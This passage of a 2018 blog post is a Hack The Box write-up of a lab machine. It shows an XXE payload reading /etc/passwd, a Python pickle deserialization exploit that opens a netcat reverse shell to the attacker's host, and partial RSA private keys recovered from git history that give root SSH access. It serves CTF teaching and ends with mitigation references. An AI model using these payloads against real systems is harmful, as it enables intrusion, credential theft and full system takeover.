+<span style="color: #f92672">&lt;/body&gt;</span>
+</code></pre></div>
+
+<p>Indeed, the endpoint shows the exact same confirmation message as before.
+Reading files now works like so:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-xml" data-lang="xml"><span></span><span style="color: #75715e">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span style="color: #75715e">&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;
+<span style="color: #f92672">&lt;body&gt;</span>
+  <span style="color: #f92672">&lt;Author&gt;</span>auth<span style="color: #f92672">&lt;/Author&gt;</span>
+  <span style="color: #f92672">&lt;Subject&gt;</span>subj<span style="color: #f92672">&lt;/Subject&gt;</span>
+  <span style="color: #f92672">&lt;Content&gt;</span><span style="color: #f8f8f2">&amp;example;</span><span style="color: #f92672">&lt;/Content&gt;</span>
+<span style="color: #f92672">&lt;/body&gt;</span>
+</code></pre></div>
+
+<p>This payload produces the following confirmation method, truncated for
+readability:</p>
+
+<pre><code> PROCESSED BLOGPOST: 
+Author: auth
+Subject: subj
+Content: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+git:x:1001:1001:git,,,:/home/git:/bin/bash
+roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
+...
+</code></pre>
+
+<p>Remember that the source code should live in a file called &ldquo;feed.py&rdquo;, and in a
+directory called &ldquo;/home/roosa/deploy/src&rdquo;? We can use this knowledge to read it
+with XXE. Request &ldquo;/home/roosa/deploy/src/feed.py&rdquo; and you get the source.</p>
+
+<p>It discloses two things of relevance. One is that there was a deubgconsole for
+development, but it seems to be disabled. Keep it in mind and ignore all other
+hints for the debug console you may find on the box. The other is how the
+endpoint &ldquo;<a href="http://10.10.10.91/newpost&quot;">http://10.10.10.91/newpost&quot;</a> works:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">...</span>
+<span style="color: #a6e22e">@app.route</span><span style="color: #f8f8f2">(</span><span style="color: #e6db74">&quot;/newpost&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">methods</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">[</span><span style="color: #e6db74">&quot;POST&quot;</span><span style="color: #f8f8f2">])</span>
+<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">newpost</span><span style="color: #f8f8f2">():</span>
+  <span style="color: #75715e"># TODO: proper save to database, this is for testing purposes right now</span>
+  <span style="color: #f8f8f2">picklestr</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64decode(request</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">data)</span>
+<span style="color: #75715e">#  return picklestr</span>
+  <span style="color: #f8f8f2">postObj</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">pickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">loads(picklestr)</span>
+  <span style="color: #66d9ef">return</span> <span style="color: #e6db74">&quot;POST RECEIVED: &quot;</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">postObj[</span><span style="color: #e6db74">&#39;Subject&#39;</span><span style="color: #f8f8f2">]</span>
+
+
+<span style="color: #75715e">## TODO: VERY important! DISABLED THIS IN PRODUCTION</span>
+<span style="color: #75715e">#app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
+<span style="color: #75715e"># TODO: Replace run-gunicorn.sh with real Linux service script</span>
+<span style="color: #75715e"># app = DebuggedApplication(app, evalex=True, console_path=&#39;/debugconsole&#39;)</span>
+
+<span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">__name__</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;__main__&quot;</span><span style="color: #f8f8f2">:</span>
+  <span style="color: #f8f8f2">app</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">run(host</span><span style="color: #f92672">=</span><span style="color: #e6db74">&#39;0.0.0,0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">Debug</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">True)</span>
+</code></pre></div>
+
+<h2 id="rce-with-pickle">RCE with pickle</h2>
+
+<p>The snipped above shows how the request data is fed into
+<a href="https://docs.python.org/2/library/pickle.html">pickle</a>, a Python module for
+serialization of Python objects. It can be very useful but is not meant to be
+used on untrusted input, as the big red box in the Python docs indicates.</p>
+
+<p>Exploiting pickle to get code execution is <a href="https://lincolnloop.com/blog/playing-pickle-security/">very
+easy</a>. But first, we
+start by getting the basics right and craft a working payload. The code expects
+a base64-encoded pickle string, turns it into an object, apparently expecting a
+Python dictionary. It then reads the &lsquo;Subject&rsquo; item and returns that as text.
+The following code snippet produces a valid payload:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">import</span> <span style="color: #f8f8f2">cPickle</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">base64</span>
+
+<span style="color: #f8f8f2">post</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;Subject&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;mynewpost&quot;</span><span style="color: #f8f8f2">}</span>
+
+<span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cPickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">dumps(post)</span>
+<span style="color: #f8f8f2">encoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64encode(payload)</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(encoded)</span>
+</code></pre></div>
+
+<p>Submitting it returns the expected response:</p>
+
+<pre><code> $ curl -X POST -H &quot;Content-Type: text/plain&quot; -d &quot;$(python make_post.py)&quot; http://10.10.10.91:5000/newpost
+POST RECEIVED: mynewpost
+</code></pre>
+
+<p>Time to modify the pickle string such that we get a shell. We use the
+<a href="https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types">__reduce__</a>
+method for it, which is a special method allowing custom Python objects to
+declare how they can be reconstructed. Basically, you return a function and
+arguments, and they will be executed when Python tries to deserialize the
+object. You can just make it execute a shell command:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-python" data-lang="python"><span></span><span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">cPickle</span>
+<span style="color: #f92672">import</span> <span style="color: #f8f8f2">base64</span>
+
+<span style="color: #f8f8f2">cmd</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 9000 &gt;/tmp/x&#39;</span>
+
+<span style="color: #66d9ef">class</span> <span style="color: #a6e22e">MyClass</span><span style="color: #f8f8f2">(object):</span>
+    <span style="color: #66d9ef">def</span> <span style="color: #a6e22e">__reduce__</span><span style="color: #f8f8f2">(self):</span>
+        <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">(os</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">system,</span> <span style="color: #f8f8f2">(cmd,))</span>
+
+<span style="color: #f8f8f2">payload</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">cPickle</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">dumps(MyClass())</span>
+<span style="color: #f8f8f2">encoded</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">base64</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">urlsafe_b64encode(payload)</span>
+<span style="color: #66d9ef">print</span><span style="color: #f8f8f2">(encoded)</span>
+</code></pre></div>
+
+<p>Submit it like the payload before, and don&rsquo;t forget to listen on 9000. The
+upload will hang and you get a shell:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nc -lnvp <span style="color: #ae81ff">9000</span>
+listening on [any] 9000 ...
+connect to [10.10.15.130] from (UNKNOWN) [10.10.10.91] 52904
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
+</code></pre></div>
+
+<h1 id="on-the-system">On the system</h1>
+
+<p>We have a shell with the user &ldquo;roosa&rdquo;, which seems to be in group &ldquo;sudo&rdquo;.
+Thus, one thing to try is to upgrade the shell to a fully interactive TTY as
+described
+<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic">here</a>.
+Then try <code>sudo -l</code> to see what you can do. For me though, this command just hang
+longer than I was willing to wait.</p>
+
+<p>Anyways, just looking around in the home directory of &ldquo;roosa&rdquo; reveals an
+interesting folder with source code and, most interestingly, an RSA key:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+...
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+-----END RSA PRIVATE KEY-----
+</code></pre></div>
+
+<p>Looking further, we see it is a git repository:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>roosa@gitter:~/work/blogfeed$ ll
+total 28
+drwxrwx--- 5 roosa roosa 4096 Mar 21  2018 ./
+drwxrwxr-x 3 roosa roosa 4096 Mar 21  2018 ../
+drwxrwx--- 8 roosa roosa 4096 Oct  1 15:58 .git/
+-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
+drwxrwx--- 3 roosa roosa 4096 Mar 19  2018 resources/
+-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh*
+drwxrwx--- 2 roosa roosa 4096 Mar 26  2018 src/
+</code></pre></div>
+
+<p>Checking out the commit log with <code>git log</code> there are a couple of interesting
+messages:</p>
+
+<pre><code>...
+commit 33e87c312c08735a02fa9c796021a4a3023129ad
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:33:06 2018 -0400
+
+    reverted accidental commit with proper key
+...
+commit d387abf63e05c9628a59195cec9311751bdb283f
+Author: Roosa Hakkerson &lt;roosa@solita.fi&gt;
+Date:   Mon Mar 19 09:32:03 2018 -0400
+
+    add key for feed integration from tnerprise backend
+</code></pre>
+
+<p>It seems as if there was a wrong key committed to the repo, which then got
+changed to the current one. Comparing commits shows this theory is correct:</p>
+
+<pre><code>roosa@gitter:~/work/blogfeed/src$ git diff HEAD~~~~~~ HEAD~~~~~
+diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
+index 44c981f..f4bde49 100644
+--- a/resources/integration/authcredentials.key
++++ b/resources/integration/authcredentials.key
+@@ -1,28 +1,27 @@
+ -----BEGIN RSA PRIVATE KEY-----
+-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+...
+-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
++MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
++ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+...
++T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
++bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+ -----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Now we have two RSA keys, which I call &ldquo;existing-key.key&rdquo; and
+&ldquo;deleted-key.key&rdquo;. Try using them to log in via SSH, and you will find the
+deleted key works for root. You can then get the flag:</p>
+
+<pre><code> $ ssh -i deleted-key.key root@10.10.10.91
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Mon Oct  1 16:36:38 2018 from 10.10.14.4
+root@gitter:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@gitter:~# cat /root/root.txt
+&lt;root-flag-here&gt;
+</code></pre>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li><a href="https://www.acunetix.com/blog/web-security-zone/how-to-mitigate-xxe-vulnerabilities-in-python/">Comparison</a>
+of Python XML parsers with regards to XXE. The gist is to use either <code>minidom</code>
+or <code>etree</code>. However, note the Python docs themselves still list some DOS
+vulnerabilities for those:
+[docs][<a href="https://docs.python.org/2/library/xml.html#xml-vulnerabilities">https://docs.python.org/2/library/xml.html#xml-vulnerabilities</a>]</li>
+<li>Regarding pickle on untrusted input, there are
+<a href="https://docs.python.org/3/library/pickle.html#restricting-globals">ways</a> to
+restrict pickle such that certain attacks are prevented. Personally, I would
+not trust these solutions and rather just use another format, even if it
+means writing more code.</li>
+<li>Other
+<a href="https://epi052.gitlab.io/notes-to-self/blog/2018-10-11-hack-the-box-devoops/">write-up</a>
+showing how to use the unintended way.</li>
+<li>Video <a href="https://www.youtube.com/watch?v=tQ34Ntkr7H4">walkthrough</a> by ippsec.</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2018-10-13T00:00:00&#43;02:00">
+    13 Oct, 2018
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">1441</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_sunday/">Hack The Box Write-up - Sunday</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/stego_book_of_secrets/">Steganography challenge - The Book of Secrets</a>
+        <time datetime="10M">10 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
